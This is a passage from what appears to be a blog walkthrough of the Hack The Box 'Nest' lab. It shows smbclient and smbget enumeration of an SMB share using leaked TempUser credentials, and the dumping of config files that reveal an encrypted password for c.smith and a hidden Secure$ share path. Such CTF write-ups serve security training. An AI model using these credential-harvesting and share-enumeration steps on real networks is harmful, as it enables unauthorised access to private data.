<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cat <span class="string">'Maintenance Alerts.txt'</span> </span><br><span class="line">There is currently no scheduled maintenance work</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Not much interesting so let‚Äôs move another phase.</p>
<h3 id="Enumerating-SMB-Shares"><a href="#Enumerating-SMB-Shares" class="headerlink" title="Enumerating SMB Shares"></a>Enumerating SMB Shares</h3><p>The <code>Welcome Email.txt</code> give us credentials of <code>TempUser</code>. so I‚Äôll try it to <code>smbclient</code> then let‚Äôs see if gives us any further access to the <code>Data</code> share so :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Data -U TempUser</span><br><span class="line">Enter WORKGROUP\TempUser<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  IT                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  Shared                              D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Archive                             D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string">  Configs                             D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  Installs                            D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string">  Tools                               D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Production</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  Maintenance                         D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Templates                           D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Archive</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  Adobe                               D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  Atlas                               D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  DLink                               D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string">  Microsoft                           D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  NotepadPlusPlus                     D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  RU Scanner                          D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  Server Manager                      D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Installs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Tools</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Maintenance</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Maintenance Alerts.txt              A       48  Tue Aug  6 07:01:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  HR                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Marketing                           D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Adobe</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  editing.xml                        AH      246  Sat Aug  3 20:58:42 2019</span></span><br><span class="line"><span class="string">  Options.txt                         A        0  Tue Oct 11 05:11:14 2011</span></span><br><span class="line"><span class="string">  projects.xml                        A      258  Wed Jan  9 00:30:52 2013</span></span><br><span class="line"><span class="string">  settings.xml                        A     1274  Thu Aug  8 03:19:12 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Atlas</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  Temp.XML                            A     1369  Wed Jun 11 15:38:22 2003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\DLink</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Microsoft</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  Options.xml                         A     4598  Sun Mar  4 03:24:24 2012</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\NotepadPlusPlus</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  config.xml                          A     6451  Thu Aug  8 07:01:25 2019</span></span><br><span class="line"><span class="string">  shortcuts.xml                       A     2108  Thu Aug  8 03:30:27 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\RU Scanner</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  RU_config.xml                       A      270  Fri Aug  9 03:49:37 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Server Manager</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\HR</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\Marketing</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6543883 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt;</span></span><br></pre></td></tr></table></figure>

<p>Looks like we have access to a some files in the <strong><code>IT</code></strong> directory now. I just recursively pull down all the files in the share so :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbget -R  smb://10.10.10.178/Data/ -U TempUser</span><br><span class="line">Password <span class="keyword">for</span> [TempUser] connecting to //Data/10.10.10.178: </span><br><span class="line">Using workgroup WORKGROUP, user TempUser</span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/editing.xml                                                                                                                                                                                     </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/Options.txt                                                                                                                                                                                     </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/projects.xml                                                                                                                                                                                    </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/settings.xml                                                                                                                                                                                    </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Atlas/Temp.XML                                                                                                                                                                                        </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Microsoft/Options.xml                                                                                                                                                                                 </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/config.xml                                                                                                                                                                            </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/shortcuts.xml                                                                                                                                                                         </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/RU Scanner/RU_config.xml                                                                                                                                                                              </span><br><span class="line">smb://10.10.10.178/Data//Shared/Maintenance/Maintenance Alerts.txt                                                                                                                                                                        </span><br><span class="line">smb://10.10.10.178/Data//Shared/Templates/HR/Welcome Email.txt                                                                                                                                                                            </span><br><span class="line">Downloaded 16.65kB <span class="keyword">in</span> 95 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest took 1m34s </span><br><span class="line">‚ùØ ls</span><br><span class="line"> IT  <span class="string">'Maintenance Alerts.txt'</span>   nmap-Nest   Production   Reports   Shared  <span class="string">'Welcome Email.txt'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>When I enumerate all the files 1 by 1 on my operating system i found interesting stuff ‚Äì <code>RU_Config.xml</code> and <code>config.xml</code> inside this directory <strong>/IT/Configs/RU Scanner/RU_Config.xml</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ <span class="built_in">cd</span> IT/Configs/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Nest/IT/Configs </span><br><span class="line">‚ùØ ls</span><br><span class="line"> Adobe   Atlas   DLink   Microsoft   NotepadPlusPlus  <span class="string">'RU Scanner'</span>  <span class="string">'Server Manager'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Nest/IT/Configs </span><br><span class="line">‚ùØ <span class="built_in">cd</span> <span class="string">'RU Scanner'</span>/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ ls</span><br><span class="line">RU_config.xml</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>and this the content of <code>xml</code> file I got :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ cat RU_config.xml </span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;ConfigFile xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns:xsd=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span><br><span class="line">  &lt;Port&gt;389&lt;/Port&gt;</span><br><span class="line">  &lt;Username&gt;c.smith&lt;/Username&gt;</span><br><span class="line">  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;</span><br><span class="line">&lt;/ConfigFile&gt;</span><br><span class="line">root <span class="keyword">in</span> IT/Configs/RU Scanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>I thought I would use it to try authenticating to the <code>SMB shares</code> but its Authenticaition failed, So i think the password is encrypted‚Äô leading me to suspect that the password needs to be decrypted.</p>
<p>Next the <code>config.xml</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/NotepadPlusPlus </span><br><span class="line">‚ùØ cat config.xml </span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"Windows-1252"</span> ?&gt;</span><br><span class="line">&lt;NotepadPlus&gt;</span><br><span class="line">    &lt;GUIConfigs&gt;</span><br><span class="line">        &lt;!-- 3 status : <span class="string">"large"</span>, <span class="string">"small"</span> or <span class="string">"hide"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ToolBar"</span> visible=<span class="string">"yes"</span>&gt;standard&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- 2 status : <span class="string">"show"</span> or <span class="string">"hide"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"StatusBar"</span>&gt;show&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- For all attributs, 2 status : <span class="string">"yes"</span> or <span class="string">"no"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TabBar"</span> dragAndDrop=<span class="string">"yes"</span> drawTopBar=<span class="string">"yes"</span> drawInactiveTab=<span class="string">"yes"</span> reduce=<span class="string">"yes"</span> closeButton=<span class="string">"no"</span> doubleClick2Close=<span class="string">"no"</span> vertical=<span class="string">"no"</span> multiLine=<span class="string">"no"</span> hide=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;!-- 2 positions : <span class="string">"horizontal"</span> or <span class="string">"vertical"</span>--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaViewsSplitter"</span>&gt;vertical&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!-- For the attribut of position, 2 status : docked or undocked ; 2 status : <span class="string">"show"</span> or <span class="string">"hide"</span> --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"UserDefineDlg"</span> position=<span class="string">"undocked"</span>&gt;hide&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TabSetting"</span> size=<span class="string">"4"</span> replaceBySpace=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;!--App position--&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"AppPosition"</span> x=<span class="string">"662"</span> y=<span class="string">"95"</span> width=<span class="string">"955"</span> height=<span class="string">"659"</span> isMaximized=<span class="string">"yes"</span> /&gt;</span><br><span class="line">        &lt;!-- For the primary scintilla view,</span><br><span class="line">             2 status <span class="keyword">for</span> Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="string">"show"</span> or <span class="string">"hide"</span></span><br><span class="line">             4 status <span class="keyword">for</span> Attribut folderMarkStyle : <span class="string">"simple"</span>, <span class="string">"arrow"</span>, <span class="string">"circle"</span> and <span class="string">"box"</span>  --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaPrimaryView"</span> lineNumberMargin=<span class="string">"show"</span> bookMarkMargin=<span class="string">"show"</span> folderMarkStyle=<span class="string">"box"</span> indentGuideLine=<span class="string">"show"</span> currentLineHilitingShow=<span class="string">"show"</span> Wrap=<span class="string">"yes"</span> edge=<span class="string">"no"</span> edgeNbColumn=<span class="string">"100"</span> wrapSymbolShow=<span class="string">"hide"</span> zoom=<span class="string">"0"</span> whiteSpaceShow=<span class="string">"hide"</span> eolShow=<span class="string">"hide"</span> lineWrapMethod=<span class="string">"aligned"</span> zoom2=<span class="string">"0"</span> /&gt;</span><br><span class="line">        &lt;!-- For the secodary scintilla view,</span><br><span class="line">             2 status <span class="keyword">for</span> Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="string">"show"</span> or <span class="string">"hide"</span></span><br><span class="line">             4 status <span class="keyword">for</span> Attribut folderMarkStyle : <span class="string">"simple"</span>, <span class="string">"arrow"</span>, <span class="string">"circle"</span> and <span class="string">"box"</span> --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Auto-detection"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"CheckHistoryFiles"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TrayIcon"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"RememberLastSession"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                        New Document default settings :</span><br><span class="line">                                format = 0/1/2 -&gt; win/unix/mac</span><br><span class="line">                                encoding = 0/1/2/3/4/5 -&gt; ANSI/UCS2Big/UCS2small/UTF8/UTF8-BOM</span><br><span class="line">                                defaultLang = 0/1/2/..</span><br><span class="line"></span><br><span class="line">                        Note 1 : UTF8-BOM -&gt; UTF8 without BOM</span><br><span class="line">                        Note 2 : <span class="keyword">for</span> defaultLang :</span><br><span class="line">                                        0 -&gt; L_TXT</span><br><span class="line">                                        1 -&gt; L_PHP</span><br><span class="line">                                        ... (see <span class="built_in">source</span> file)</span><br><span class="line">                --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"NewDocDefaultSettings"</span> format=<span class="string">"0"</span> encoding=<span class="string">"0"</span> lang=<span class="string">"0"</span> codepage=<span class="string">"-1"</span> openAnsiAsUTF8=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"langsExcluded"</span> gr0=<span class="string">"0"</span> gr1=<span class="string">"0"</span> gr2=<span class="string">"0"</span> gr3=<span class="string">"0"</span> gr4=<span class="string">"0"</span> gr5=<span class="string">"0"</span> gr6=<span class="string">"0"</span> gr7=<span class="string">"0"</span> langMenuCompact=<span class="string">"yes"</span> /&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                printOption is <span class="built_in">print</span> colour setting, the following values are possible :</span><br><span class="line">                        0 : WYSIWYG</span><br><span class="line">                        1 : Invert colour</span><br><span class="line">                        2 : B &amp; W</span><br><span class="line">                        3 : WYSIWYG but without background colour</span><br><span class="line">                --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Print"</span> lineNumber=<span class="string">"no"</span> printOption=<span class="string">"0"</span> headerLeft=<span class="string">"<span class="variable">$(FULL_CURRENT_PATH)</span>"</span> headerMiddle=<span class="string">""</span> headerRight=<span class="string">"<span class="variable">$(LONG_DATE)</span> <span class="variable">$(TIME)</span>"</span> headerFontName=<span class="string">"IBMPC"</span> headerFontStyle=<span class="string">"1"</span> headerFontSize=<span class="string">"8"</span> footerLeft=<span class="string">""</span> footerMiddle=<span class="string">"-<span class="variable">$(CURRENT_PRINTING_PAGE)</span>-"</span> footerRight=<span class="string">""</span> footerFontName=<span class="string">""</span> footerFontStyle=<span class="string">"0"</span> footerFontSize=<span class="string">"9"</span> margeLeft=<span class="string">"0"</span> margeTop=<span class="string">"0"</span> margeRight=<span class="string">"0"</span> margeBottom=<span class="string">"0"</span> /&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">                            Backup Setting :</span><br><span class="line">                                0 : non backup</span><br><span class="line">                                1 : simple backup</span><br><span class="line">                                2 : verbose backup</span><br><span class="line">                      --&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Backup"</span> action=<span class="string">"0"</span> useCustumDir=<span class="string">"no"</span> dir=<span class="string">""</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TaskList"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"SaveOpenFileInSameDir"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"noUpdate"</span> intervalDays=<span class="string">"15"</span> nextUpdateDate=<span class="string">"20080426"</span>&gt;no&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MaitainIndent"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MRU"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"URL"</span>&gt;0&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"globalOverride"</span> <span class="built_in">fg</span>=<span class="string">"no"</span> <span class="built_in">bg</span>=<span class="string">"no"</span> font=<span class="string">"no"</span> fontSize=<span class="string">"no"</span> bold=<span class="string">"no"</span> italic=<span class="string">"no"</span> underline=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"auto-completion"</span> autoCAction=<span class="string">"0"</span> triggerFromNbChar=<span class="string">"1"</span> funcParams=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"sessionExt"</span>&gt;&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"SmartHighLight"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"TagsMatchHighLight"</span> TagAttrHighLight=<span class="string">"yes"</span> HighLightNonHtmlZone=<span class="string">"no"</span>&gt;yes&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"MenuBar"</span>&gt;show&lt;/GUIConfig&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"Caret"</span> width=<span class="string">"1"</span> blinkRate=<span class="string">"250"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"ScintillaGlobalSettings"</span> enableMultiSelection=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"openSaveDir"</span> value=<span class="string">"0"</span> defaultDirPath=<span class="string">""</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"titleBar"</span> short=<span class="string">"no"</span> /&gt;</span><br><span class="line">        &lt;GUIConfig name=<span class="string">"DockingManager"</span> leftWidth=<span class="string">"200"</span> rightWidth=<span class="string">"200"</span> topHeight=<span class="string">"200"</span> bottomHeight=<span class="string">"266"</span>&gt;</span><br><span class="line">            &lt;FloatingWindow cont=<span class="string">"4"</span> x=<span class="string">"39"</span> y=<span class="string">"109"</span> width=<span class="string">"531"</span> height=<span class="string">"364"</span> /&gt;</span><br><span class="line">            &lt;PluginDlg pluginName=<span class="string">"dummy"</span> id=<span class="string">"0"</span> curr=<span class="string">"3"</span> prev=<span class="string">"-1"</span> isVisible=<span class="string">"yes"</span> /&gt;</span><br><span class="line">            &lt;PluginDlg pluginName=<span class="string">"NppConverter.dll"</span> id=<span class="string">"3"</span> curr=<span class="string">"4"</span> prev=<span class="string">"0"</span> isVisible=<span class="string">"no"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"0"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"1"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"2"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">            &lt;ActiveTabs cont=<span class="string">"3"</span> activeTab=<span class="string">"-1"</span> /&gt;</span><br><span class="line">        &lt;/GUIConfig&gt;</span><br><span class="line">    &lt;/GUIConfigs&gt;</span><br><span class="line">    &lt;!-- The History of opened files list --&gt;</span><br><span class="line">    &lt;FindHistory nbMaxFindHistoryPath=<span class="string">"10"</span> nbMaxFindHistoryFilter=<span class="string">"10"</span> nbMaxFindHistoryFind=<span class="string">"10"</span> nbMaxFindHistoryReplace=<span class="string">"10"</span> matchWord=<span class="string">"no"</span> matchCase=<span class="string">"no"</span> wrap=<span class="string">"yes"</span> directionDown=<span class="string">"yes"</span> fifRecuisive=<span class="string">"yes"</span> fifInHiddenFolder=<span class="string">"no"</span> dlgAlwaysVisible=<span class="string">"no"</span> fifFilterFollowsDoc=<span class="string">"no"</span> fifFolderFollowsDoc=<span class="string">"no"</span> searchMode=<span class="string">"0"</span> transparencyMode=<span class="string">"0"</span> transparency=<span class="string">"150"</span>&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"text"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"txt"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"itx"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"iTe"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"IEND"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"redeem"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"activa"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"activate"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"redeem on"</span> /&gt;</span><br><span class="line">        &lt;Find name=<span class="string">"192"</span> /&gt;</span><br><span class="line">        &lt;Replace name=<span class="string">"C_addEvent"</span> /&gt;</span><br><span class="line">    &lt;/FindHistory&gt;</span><br><span class="line">    &lt;History nbMaxFile=<span class="string">"15"</span> inSubMenu=<span class="string">"no"</span> customLength=<span class="string">"-1"</span>&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"C:\windows\System32\drivers\etc\hosts"</span> /&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> /&gt;</span><br><span class="line">        &lt;File filename=<span class="string">"C:\Users\C.Smith\Desktop\todo.txt"</span> /&gt;</span><br><span class="line">    &lt;/History&gt;</span><br><span class="line">&lt;/NotepadPlus&gt;</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> IT/Configs/NotepadPlusPlus </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Looking at the very bottom of <code>config.xml</code> I see another interesting stuff. Someone was accessing files on the <code>Secure$</code> share as well as files on the <code>C.Smith</code> user‚Äôs desktop.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">&lt;History nbMaxFile=<span class="string">"15"</span> inSubMenu=<span class="string">"no"</span> customLength=<span class="string">"-1"</span>&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"C:\windows\System32\drivers\etc\hosts"</span> /&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> /&gt;</span><br><span class="line">    &lt;File filename=<span class="string">"C:\Users\C.Smith\Desktop\todo.txt"</span> /&gt;</span><br><span class="line">&lt;/History&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Enumerate-TempUser"><a href="#Enumerate-TempUser" class="headerlink" title="Enumerate TempUser"></a>Enumerate TempUser</h3><p>so let‚Äôs see if we can access anything in this share as <code>TempUser</code> :</p>
